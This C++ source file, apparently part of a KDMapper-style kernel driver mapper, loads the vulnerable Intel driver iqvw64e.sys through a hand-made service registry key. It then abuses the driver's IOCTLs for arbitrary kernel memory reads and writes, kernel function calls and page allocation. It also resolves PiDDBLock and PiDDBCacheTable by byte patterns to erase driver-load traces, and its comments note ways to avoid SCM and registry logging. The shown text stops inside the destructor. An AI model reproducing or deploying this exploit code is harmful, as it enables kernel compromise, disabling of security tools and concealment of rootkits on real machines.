
#include "Common.hpp"
#include "IntelLoader.hpp"



#pragma comment(lib, "ntdll.lib")




extern "C"
{
	NTSTATUS NTAPI NtLoadDriver(PUNICODE_STRING DriverServiceName);
	NTSTATUS NTAPI NtUnloadDriver(PUNICODE_STRING DriverServiceName);
}


// Ctor
IntelLoader::IntelLoader() : hIntelDriver(INVALID_HANDLE_VALUE)
{

}


/// <summary>
/// Will load the vulnerable Intel driver, nothing magic, loading is done normally.
/// </summary>
/// <returns>True or False</returns>
BOOL IntelLoader::LoadVulnDriver()
{
	WCHAR tempPath[MAX_PATH];
	GetTempPathW(MAX_PATH, tempPath);

	std::wstring DriverPath = std::wstring(tempPath) + L"iqvw64e.sys";
	std::wstring nPath = L"\\??\\" + DriverPath;

	std::wstring serviceName = L"ValkyrieLdr";
	std::wstring servicesPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;

	HKEY dservice;
	LSTATUS status = RegCreateKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &dservice);
	if (status != ERROR_SUCCESS)
	{
		std::cout << "[-] Can't create service key\n";
		return FALSE;
	}

	// ImagePath using REG_EXPAND_SZ
	status = RegSetKeyValueW(dservice, NULL, L"ImagePath", REG_EXPAND_SZ,
		nPath.c_str(), (DWORD)(nPath.size() * sizeof(wchar_t)));
	if (status != ERROR_SUCCESS) 
	{
		RegCloseKey(dservice);
		RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
		std::cout << "[-] Can't create 'ImagePath' registry value\n";
		return FALSE;
	}

	// Type = SERVICE_KERNEL_DRIVER (1)
	DWORD ServiceTypeKernel = 1;
	status = RegSetKeyValueW(dservice, NULL, L"Type", REG_DWORD,
		&ServiceTypeKernel, sizeof(DWORD));
	if (status != ERROR_SUCCESS)
	{
		RegCloseKey(dservice);
		RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
		std::cout << "[-] Can't create 'Type' registry value\n";
		return FALSE;
	}

	RegCloseKey(dservice);

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL)
	{
		RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
		return FALSE;
	}

	typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
	auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");

	ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	NTSTATUS ntStatus = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);

	if (!NT_SUCCESS(ntStatus)) 
	{
		RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
		std::cout << "[-] Failed to acquire SE_LOAD_DRIVER_PRIVILEGE\n";
		return FALSE;
	}

	// Load driver
	// TODO!! Note that every registry write is logged wy windows. Take care of it.
	std::wstring wdriver_reg_path = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + serviceName;
	UNICODE_STRING serviceStr;
	RtlInitUnicodeString(&serviceStr, wdriver_reg_path.c_str());

	ntStatus = NtLoadDriver(&serviceStr);

	LOG_SUCCESS_HEX("Intel driver loader. Exit code : ", ntStatus);

	if (!NT_SUCCESS(ntStatus))
	{
		RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());

		if (ntStatus == 0xC0000603) // STATUS_IMAGE_CERT_REVOKED
		{
			std::cout << "[-] Vulnerable driver blocklist is enabled!\n";
		}
		return FALSE;
	}

	return TRUE;
}



BOOL IntelLoader::UnloadVulnDriver()
{
	std::wstring serviceName = L"ValkyrieLdr";
	std::wstring serviceStr = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + serviceName;


	if (hIntelDriver && hIntelDriver != INVALID_HANDLE_VALUE)
	{
		LOG_INFO(L"Closing driver handle...");
		CloseHandle(hIntelDriver);
		hIntelDriver = INVALID_HANDLE_VALUE;
		Sleep(500); // Just to leave some time to kernel to free ressources
	}

	// Straight NtUnloadDriver so no SCM trace wich is fine.
	UNICODE_STRING us;
	RtlInitUnicodeString(&us, serviceStr.c_str());

	NTSTATUS status = NtUnloadDriver(&us);
	if (!NT_SUCCESS(status))
	{
		if (status == 0xC0000001) // STATUS_UNSUCCESSFUL
		{
			LOG_SUCCESS(L"Driver already unloaded");
		}
		else
		{
			LOG_ERROR(L"NtUnloadDriver failed: 0x" << status);

			if (status == 0xC000010E) // STATUS_DEVICE_BUSY
			{
				LOG_ERROR(L"Device busy handle may still be open somewhere"); // BAD, should not happen in any cases.
				return FALSE;
			}
		}
	}
	else
	{
		LOG_SUCCESS(L"Driver unloaded successfully");
	}

	// TODO FIX THIS. Reg cleaning need his own func.
	std::wstring regPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
	LSTATUS regStatus = RegDeleteTreeW(HKEY_LOCAL_MACHINE, regPath.c_str());

	if (regStatus == ERROR_SUCCESS)
	{
		LOG_SUCCESS("Registry key deleted");
	}
	else if (regStatus == ERROR_FILE_NOT_FOUND)
	{
		LOG_SUCCESS("Registry key already deleted");
	}
	else
	{
		LOG_ERROR("Failed to delete registry key. Error: " << regStatus);
	}

	return TRUE;
}

BOOL IntelLoader::OpenDevice()
{
	hIntelDriver = CreateFileW(
		DEVICE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		0,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr);

	if (hIntelDriver == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR("Error opening handle to vulnerable Intel driver.");
		return FALSE;

	}


	LOG_SUCCESS("Handle to vulnerable driver opened successfully");
	return TRUE;
}


BOOL IntelLoader::MemoryCopy(uint64_t destination, uint64_t source, uint64_t size) const
{
	if (!destination || !source || !size)
		return 0;

	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

	copy_memory_buffer.case_number = COPY_MEMORY_BUFF_INFO;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(hIntelDriver, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

BOOL IntelLoader::SetMemory(uint64_t address, uint32_t value, uint64_t size) const
{
	if (!address || !size)
		return 0;

	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

	fill_memory_buffer.case_number = FILL_MEMORY_BUFF_INFO;
	fill_memory_buffer.destination = address;
	fill_memory_buffer.value = value;
	fill_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(hIntelDriver, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

BOOL IntelLoader::GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) const
{
	if (!address)
		return 0;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

	get_phys_address_buffer.case_number = GET_PHYS_ADDRESS_BUFF_INFO;
	get_phys_address_buffer.address_to_translate = address;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(hIntelDriver, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
		return false;

	*out_physical_address = get_phys_address_buffer.return_physical_address;
	return true;
}

UINT64 IntelLoader::MapIoSpace(uint64_t physical_address, uint32_t size) const
{
	if (!physical_address || !size)
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

	map_io_space_buffer.case_number = MAP_IO_SPACE_BUFF_INFO;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(hIntelDriver, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;

	return map_io_space_buffer.return_virtual_address;
}

BOOL IntelLoader::UnmapIoSpace(uint64_t address, uint32_t size) const
{
	if (!address || !size)
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

	unmap_io_space_buffer.case_number = UNMAP_IO_SPACE_BUFF_INFO;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(hIntelDriver, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}

BOOL IntelLoader::ExFreePool(uint64_t address)
{
	if (!address) return false;

	static uint64_t exFreePoolAddress = GetKernelModuleExport(ntoskrnlBaseAddress, "ExFreePool");
	if (!exFreePoolAddress)
	{
		LOG_ERROR("ExFreePool export not found");
		return false;
	}


	LOG_SUCCESS_HEX("ExFreePool -> ", exFreePoolAddress);

	return CallKernelFunction<void>(ntoskrnlBaseAddress, nullptr, exFreePoolAddress, address);
}

BOOL IntelLoader::ExReleaseResourceLite(PVOID resource)
{
	if (!resource) return FALSE;

	if (!ntoskrnlBaseAddress)
		SetKernelBaseAddress();

	if (!ntoskrnlBaseAddress)
	{
		LOG_ERROR("Failed to get ntoskrnl base address.");
		return FALSE;
	}

	UINT64 address = GetKernelModuleExport(ntoskrnlBaseAddress, "ExReleaseResourceLite");
	if (!address)
	{
		LOG_ERROR("ExReleaseResourceLite export not found");
		return FALSE;
	}

	LOG_SUCCESS_HEX("ExReleaseResourceLite : ", address);


	return CallKernelFunction<void>(ntoskrnlBaseAddress, nullptr, address, resource);
}

BOOL IntelLoader::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN Wait)
{
	if (!ntoskrnlBaseAddress)
		SetKernelBaseAddress();

	UINT64 address = GetKernelModuleExport(ntoskrnlBaseAddress, "ExAcquireResourceExclusiveLite");
	if (!address)
	{
		LOG_ERROR("Error, failed to get ExAcquireResourceExclusiveLite export");
	}

	BOOLEAN result = FALSE;
	CallKernelFunction(ntoskrnlBaseAddress, &result, address, Resource, (uint64_t)Wait);
	return result;

}

PVOID IntelLoader::GetPiDDBLock()
{
	if (!ntoskrnlBaseAddress) SetKernelBaseAddress();
	if (!ntoskrnlBaseAddress) return nullptr;




	// 1st
	uintptr_t ref = FindPatternInSectionAtKernel((char*)"PAGE", ntoskrnlBaseAddress,
		(BYTE*)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D",
		(char*)"xxxxxx????xxxxx????xxx????xxxxx????");
	if (!ref) 
	{
		// 2nd (build 22449+)
		ref = FindPatternInSectionAtKernel((char*)"PAGE", ntoskrnlBaseAddress,
			(BYTE*)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D",
			"xxx????xxxxx????xxx????");
		if (ref) ref += 16;
		else 
		{
			// 3rd pattern (build 26100+)
			ref = FindPatternInSectionAtKernel((char*)"PAGE", ntoskrnlBaseAddress,
				(BYTE*)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D",
				(char*)"xxxxxx????xxxxx????xxx????");
			if (ref) ref += 19;
		}
	}
	else ref += 28;

	if (!ref) { LOG_ERROR("PiDDBLock pattern not found"); return nullptr; }

	PVOID lock = ResolveRelativeAddress((PVOID)ref, 3, 7);
	LOG_SUCCESS_HEX("PiDDBLock resolved : ", (uintptr_t)lock);
	return lock;
}


PRTL_AVL_TABLE IntelLoader::GetPiDDBCacheTable()
{
	if (!ntoskrnlBaseAddress) SetKernelBaseAddress();
	if (!ntoskrnlBaseAddress) return nullptr;


	uintptr_t ref = FindPatternInSectionAtKernel((char*)"PAGE", ntoskrnlBaseAddress,
		(BYTE*)"\x66\x03\xD2\x48\x8D\x0D", (char*)"xxxxxx");
	if (!ref) 
	{
		ref = FindPatternInSectionAtKernel((char*)"PAGE", ntoskrnlBaseAddress,
			(BYTE*)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", (char*)"xxxxxxxx");
		if (ref) ref += 2;
	}
	if (!ref) { LOG_ERROR("PiDDBCacheTable pattern not found"); return nullptr; }

	PRTL_AVL_TABLE table = (PRTL_AVL_TABLE)ResolveRelativeAddress((PVOID)ref, 6, 10);
	LOG_SUCCESS_HEX("PiDDBCacheTable resolved : ", (uintptr_t)table);
	return table;
}

BOOLEAN IntelLoader::RtlDeleteElementGenericTableAvl(PVOID table, PVOID buffer)
{
	if (!ntoskrnlBaseAddress)
		SetKernelBaseAddress();

	UINT64 address = GetKernelModuleExport(ntoskrnlBaseAddress, "RtlDeleteElementGenericTableAvl");
	if (!address)
	{
		LOG_ERROR("Error failed to get RtlDeleteElementGenericTableAvl export");
	}

	BOOLEAN result = FALSE;
	CallKernelFunction(ntoskrnlBaseAddress, &result, address, table, buffer);
	return result;
}

PVOID IntelLoader::RtlLookupElementGenericTableAvl(PRTL_AVL_TABLE Table, PVOID Buffer)
{
	if (!Table || !Buffer)
		return nullptr;

	if (!ntoskrnlBaseAddress)
		SetKernelBaseAddress();

	UINT64 address = GetKernelModuleExport(ntoskrnlBaseAddress, "RtlLookupElementGenericTableAvl");
	if (!address)
	{
		LOG_ERROR("RtlLookupElementGenericTableAvl not found in exports");
		return nullptr;
	}

	LOG_SUCCESS_HEX("RtlLookupElementGenericTableAvl resolved :  ", address);

	PVOID result = nullptr;
	CallKernelFunction(ntoskrnlBaseAddress, &result, address, Table, Buffer);

	LOG_SUCCESS_HEX("RtlLookupElementGenericTableAvl returned : ", (uint64_t)result);
	return result;
}

PiDDBCacheEntry* IntelLoader::LookupEntry(PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name)
{
	if (!PiDDBCacheTable || !name)
		return nullptr;

	PiDDBCacheEntry searchEntry = {};
	searchEntry.TimeDateStamp = timestamp;

	USHORT nameLen = (USHORT)(wcslen(name) * sizeof(wchar_t));

	searchEntry.DriverName.Length = nameLen;
	searchEntry.DriverName.MaximumLength = nameLen + sizeof(wchar_t);

	// Allocating in ourself is less painfull...
	std::vector<wchar_t> nameBuffer(name, name + nameLen / sizeof(wchar_t) + 1);
	searchEntry.DriverName.Buffer = nameBuffer.data();

	
	PVOID result = RtlLookupElementGenericTableAvl(PiDDBCacheTable, &searchEntry);
	if (result)
		LOG_SUCCESS("LookupEntry found our driver entry");
	else
		LOG_ERROR("LookupEntry entry NOT found");

	return (PiDDBCacheEntry*)result;
}

PVOID IntelLoader::RtlEnumerateGenericTableWithoutSplayingAvl(PRTL_AVL_TABLE Table, PVOID* RestartKey)
{
	if (!Table)
		return nullptr;

	if (!ntoskrnlBaseAddress)
		SetKernelBaseAddress();

	UINT64 address = GetKernelModuleExport(ntoskrnlBaseAddress, "RtlEnumerateGenericTableWithoutSplayingAvl");
	if (!address)
	{
		LOG_ERROR("RtlEnumerateGenericTableWithoutSplayingAvl not found in exports");
		return nullptr;
	}

	PVOID result = nullptr;
	CallKernelFunction(ntoskrnlBaseAddress, &result, address, Table, (uint64_t)RestartKey);

	return result;
}


BOOL IntelLoader::ReadMemory(uint64_t address, void* buffer, uint64_t size)
{
	return MemoryCopy(reinterpret_cast<uint64_t>(buffer), address, size);

}

BOOL IntelLoader::WriteMemory(uint64_t address, void* buffer, uint64_t size)
{
	return MemoryCopy(address, reinterpret_cast<uint64_t>(buffer), size);
}

BOOL IntelLoader::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size)
{
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (!GetPhysicalAddress(address, &physical_address)) {
		std::wcout << L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl;
		return false;
	}

	const uint64_t mapped_physical_memory = MapIoSpace(physical_address, size);

	if (!mapped_physical_memory) {
		std::wcout << L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl;
		return false;
	}

	bool result = WriteMemory(mapped_physical_memory, buffer, size);


	if (!UnmapIoSpace(mapped_physical_memory, size))
		std::wcout << L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl;

	return result;
}





UINT64 IntelLoader::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name)
{
	if (!kernel_module_base || function_name.empty())
		return 0;

	IMAGE_DOS_HEADER dosHeader = {};
	IMAGE_NT_HEADERS64 ntHeaders = {};

	if (!ReadMemory(kernel_module_base, &dosHeader, sizeof(dosHeader)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
		return 0;

	if (!ReadMemory(kernel_module_base + dosHeader.e_lfanew, &ntHeaders, sizeof(ntHeaders)) || ntHeaders.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto& export_dir = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (!export_dir.VirtualAddress || !export_dir.Size)
		return 0;

	const auto exportData = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_dir.Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	if (!exportData)
		return 0;

	if (!ReadMemory(kernel_module_base + export_dir.VirtualAddress, exportData, export_dir.Size))
	{
		VirtualFree(exportData, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uintptr_t>(exportData) - export_dir.VirtualAddress;

	const auto nameRvas = reinterpret_cast<uint32_t*>(exportData->AddressOfNames + delta);
	const auto ordinals = reinterpret_cast<uint16_t*>(exportData->AddressOfNameOrdinals + delta);
	const auto functionRvas = reinterpret_cast<uint32_t*>(exportData->AddressOfFunctions + delta);

	for (uint32_t i = 0; i < exportData->NumberOfNames; ++i)
	{
		const char* currentName = reinterpret_cast<const char*>(nameRvas[i] + delta);
		if (_stricmp(currentName, function_name.c_str()) != 0)
			continue;

		const uint16_t ordinal = ordinals[i];
		const uint32_t functionRva = functionRvas[ordinal];

		// ? Forwarder check
		const bool is_forwarded = functionRva >= export_dir.VirtualAddress &&
			functionRva < export_dir.VirtualAddress + export_dir.Size;

		if (is_forwarded)
		{
			char forwardStr[256] = {};
			if (!ReadMemory(kernel_module_base + functionRva, forwardStr, sizeof(forwardStr)))
			{
				VirtualFree(exportData, 0, MEM_RELEASE);
				return 0;
			}

			const std::string forward(forwardStr);
			const auto dot = forward.find('.');
			if (dot == std::string::npos)
			{
				VirtualFree(exportData, 0, MEM_RELEASE);
				return 0;
			}

			const std::string targetModule = forward.substr(0, dot) + ".sys";
			const std::string targetFunction = forward.substr(dot + 1);

			const uint64_t targetBase = PEUtils::GetModuleBaseAddress(targetModule.c_str());
			if (!targetBase)
			{
				VirtualFree(exportData, 0, MEM_RELEASE);
				return 0;
			}

			const uint64_t result = GetKernelModuleExport(targetBase, targetFunction);
			VirtualFree(exportData, 0, MEM_RELEASE);
			return result;
		}

		const uint64_t result = kernel_module_base + functionRva;
		VirtualFree(exportData, 0, MEM_RELEASE);
		return result;
	}

	VirtualFree(exportData, 0, MEM_RELEASE);
	return 0;
}

uintptr_t IntelLoader::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask)
{
	if (!dwAddress)
	{
		LOG_ERROR("No module address to find pattern");
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024)
	{
		LOG_ERROR("Can't find pattern, Too big section");
		return 0;
	}

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(dwAddress, sectionData.get(), dwLen)) {
		LOG_ERROR("Read failed in FindPatternAtKernel");
		return 0;
	}

	auto result = FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);

	if (result <= 0)
	{
		return 0;
	}
	result = dwAddress - (uintptr_t)sectionData.get() + result;
	return result;
}

uintptr_t IntelLoader::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size)
{
	if (!modulePtr)
		return 0;

	BYTE headers[0x1000];
	if (!ReadMemory(modulePtr, headers, 0x1000))
	{
		LOG_ERROR("Can't read module headers");
		return 0;
	}

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headers;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		LOG_ERROR("Invalid DOS signature");
		return 0;
	}

	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(headers + dosHeader->e_lfanew);
	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
	{
		LOG_ERROR("Invalid NT signature");
		return 0;
	}

	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

	for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++)
	{
		char currentSectionName[9] = { 0 };
		memcpy(currentSectionName, section->Name, 8);

		if (strcmp(currentSectionName, sectionName) == 0)
		{
			if (size)
				*size = section->Misc.VirtualSize;

			std::wcout << L"[DEBUG] Found section " << sectionName
				<< L" at RVA: 0x" << std::hex << section->VirtualAddress
				<< L", Size: 0x" << section->Misc.VirtualSize << std::dec << std::endl;

			return modulePtr + section->VirtualAddress;
		}
	}

	LOG_ERROR("Section not found: " << sectionName);
	return 0;
}

uintptr_t IntelLoader::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask)
{
	std::wcout << L"[DEBUG] FindPatternInSectionAtKernel - Section: " << sectionName
		<< L", Module: 0x" << std::hex << modulePtr << std::dec << std::endl;

	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(sectionName, modulePtr, &sectionSize);

	if (!section || !sectionSize)
	{
		LOG_ERROR("Failed to find section or section has zero size");
		return 0;
	}

	std::wcout << L"[DEBUG] Section found at: 0x" << std::hex << section
		<< L", Size: 0x" << sectionSize << std::dec << std::endl;

	return FindPatternAtKernel(section, sectionSize, bMask, szMask);
}


PVOID IntelLoader::ResolveRelativeAddress(PVOID Instruction, ULONG OffsetOffset, ULONG InstructionSize)
{
	if (!Instruction)
	{
		LOG_ERROR("Invalid instruction pointer");
		return nullptr;
	}

	ULONG_PTR Instr = (ULONG_PTR)Instruction;

	std::wcout << L"[DEBUG] Resolving relative address at: 0x" << std::hex << Instr
		<< L", offset: " << OffsetOffset << L", instruction size: " << InstructionSize << std::dec << std::endl;

	BYTE instructionBytes[16] = { 0 };
	if (ReadMemory(Instr, instructionBytes, sizeof(instructionBytes)))
	{
		std::wcout << L"[DEBUG] Instruction bytes: ";
		for (int i = 0; i < 16; i++)
		{
			std::wcout << std::hex << (int)instructionBytes[i] << L" ";
		}
		std::wcout << std::dec << std::endl;
	}

	LONG RipOffset = 0;
	if (!ReadMemory(Instr + OffsetOffset, &RipOffset, sizeof(RipOffset)))
	{
		LOG_ERROR(L"Failed to read relative offset from kernel memory");
		return nullptr;
	}

	std::wcout << L"[DEBUG] Relative offset: " << std::hex << RipOffset << std::dec << std::endl;

	PVOID resolvedAddress = (PVOID)(Instr + InstructionSize + RipOffset);

	std::wcout << L"[DEBUG] Resolved address: 0x" << std::hex << resolvedAddress << std::dec << std::endl;

	return resolvedAddress;
}



uint64_t IntelLoader::MmAllocateIndependentPagesEx(uint32_t size)
{
	if (!ntoskrnlBaseAddress)
	{
		SetKernelBaseAddress();
		if (!ntoskrnlBaseAddress)
		{
			LOG_ERROR("Failed to get kernel base address");
			return 0;
		}
	}

	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;

		if (!kernel_MmAllocateIndependentPagesEx)
		{
			LOG_INFO("Searching for MmAllocateIndependentPageEx pattern...");

			// Found in KDMapper codebase. Working fine.
		   // Updated, tested from 1803 to 24H2
		  // KeAllocateInterrupt -> 41 8B D6 B9 00 10 00 00 E8 ?? ?? ?? ?? 48 8B D8
			kernel_MmAllocateIndependentPagesEx = FindPatternInSectionAtKernel(
				(char*)".text",
				ntoskrnlBaseAddress,
				(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
				(char*)"xxxxxxxxx????xxx");

	


			if (!kernel_MmAllocateIndependentPagesEx)
			{
				LOG_ERROR("Pattern search failed for MmAllocateIndependentPagesEx");
				return 0;
			}

			// Go to E8 (call)
			kernel_MmAllocateIndependentPagesEx += 8;

			kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress(
				(PVOID)kernel_MmAllocateIndependentPagesEx,
				1,
				5);

			if (!kernel_MmAllocateIndependentPagesEx)
			{
				LOG_ERROR("Failed to resolve relative address for MmAllocateIndependentPagesEx");
				return 0;
			}
		}

		LOG_SUCCESS_HEX("MmAllocateIndependentPagesEx resolved at : ",kernel_MmAllocateIndependentPagesEx);
	

	uint64_t out = 0;
	bool success = CallKernelFunction(ntoskrnlBaseAddress, &out, kernel_MmAllocateIndependentPagesEx,
		size, static_cast<uint64_t>(-1), 0, 0);

	if (!success)
	{
		LOG_ERROR("Call to MmAllocateIndependentPagesEx failed");
		return 0;
	}

	LOG_SUCCESS_HEX("MmAllocateIndependentPagesEx allocated : ", out);
	return out;
}

BOOLEAN IntelLoader::MmFreeIndependentPages(uint64_t addr, uint32_t size)
{
	if (!addr || !size)
		return false;

	if (!ntoskrnlBaseAddress)
	{
		SetKernelBaseAddress();
		if (!ntoskrnlBaseAddress)
		{
			LOG_ERROR("Failed to get kernel base address");
			return false;
		}
	}

	static uint64_t kernel_MmFreeIndependentPages = 0;

	if (!kernel_MmFreeIndependentPages)
	{
		LOG_INFO("Searching for MmFreeIndependentPages pattern...");


		if (!kernel_MmFreeIndependentPages)
		{

			// Pattern from KDMapper
			kernel_MmFreeIndependentPages = FindPatternInSectionAtKernel(
				(char*)"PAGE",
				ntoskrnlBaseAddress,
				(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
				(char*)"xxxxxxxxx????xxxxxxx");

			if (!kernel_MmFreeIndependentPages)
			{
				LOG_ERROR("Pattern search failed for MmFreeIndependentPages");
				return false;
			}

			// Move to the call (E8)
			kernel_MmFreeIndependentPages += 8;

			// Resolve relative address
			kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress(
				(PVOID)kernel_MmFreeIndependentPages,
				1,
				5);

			if (!kernel_MmFreeIndependentPages)
			{
				LOG_ERROR("Failed to resolve relative address for MmFreeIndependentPages");
				return false;
			}
		}

		LOG_SUCCESS_HEX("MmFreeIndependentPages resolved to : ", kernel_MmFreeIndependentPages);
	}

	uint64_t dummy = 0;
	bool success = CallKernelFunction(ntoskrnlBaseAddress, &dummy, kernel_MmFreeIndependentPages, addr, size);

	if (!success)
	{
		LOG_ERROR("Call to MmFreeIndependentPages failed");
		return false;
	}

	return true;
}

BOOLEAN IntelLoader::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address || !size)
		return false;

	if (!ntoskrnlBaseAddress)
	{
		SetKernelBaseAddress();
		if (!ntoskrnlBaseAddress)
		{
			LOG_ERROR("Failed to get kernel base address");
			return false;
		}
	}

	static uint64_t kernel_MmSetPageProtection = 0;

	if (!kernel_MmSetPageProtection)
	{
		LOG_INFO("Searching pattern for MmSetPageProtection...");

		if (!kernel_MmSetPageProtection)
		{
			// Pattern from KDMapper – tested 1803 to 24H2
			kernel_MmSetPageProtection = FindPatternInSectionAtKernel(
				(char*)"PAGELK",
				ntoskrnlBaseAddress,
				(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
				(char*)"xx??x???xxx");

			if (!kernel_MmSetPageProtection)
			{

				kernel_MmSetPageProtection = FindPatternInSectionAtKernel(
					(char*)"PAGELK",
					ntoskrnlBaseAddress,
					(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
					(char*)"xx??xx????x???xxx");

				if (!kernel_MmSetPageProtection)
				{
					LOG_ERROR("MmSetPageProtection pattern not found");
					return false;
				}

				kernel_MmSetPageProtection += 13;
			}
			else
			{
				kernel_MmSetPageProtection += 10;
			}

			// Resolve relative call
			kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress(
				(PVOID)kernel_MmSetPageProtection,
				1,
				5);

			if (!kernel_MmSetPageProtection)
			{
				LOG_ERROR("Failed to resolve MmSetPageProtection");
				return false;
			}
		}

		LOG_SUCCESS_HEX("MmSetPageProtection resolved : ", kernel_MmSetPageProtection);
	}

	BOOLEAN out = FALSE;
	bool success = CallKernelFunction(ntoskrnlBaseAddress, &out, kernel_MmSetPageProtection, address, size, new_protect);

	if (!success)
	{
		LOG_ERROR("Call to MmSetPageProtection failed");
		return false;
	}

	return out;
}

VOID IntelLoader::SetKernelBaseAddress()
{
	if (ntoskrnlBaseAddress)
		return;

	ntoskrnlBaseAddress = PEUtils::GetModuleBaseAddress("ntoskrnl.exe");
	if (!ntoskrnlBaseAddress)
	{
		LOG_ERROR("Error, cannot get ntoskrnl base address.");
		return;
	}
}


uint64_t IntelLoader::GetNtoskrnlBaseAddress() const noexcept
{
	return ntoskrnlBaseAddress;
}


std::wstring IntelLoader::GetDriverName()
{
	return L"iqvw64e.sys";
}

std::wstring IntelLoader::GetDriverPath()
{
	WCHAR tempPath[MAX_PATH];
	GetTempPathW(MAX_PATH, tempPath);
	return std::wstring(tempPath) + L"iqvw64e.sys";
}



IntelLoader::~IntelLoader()
{
	// hIntelDriver handle is closed by the unloading func
	// Don't close here to avoid double free.
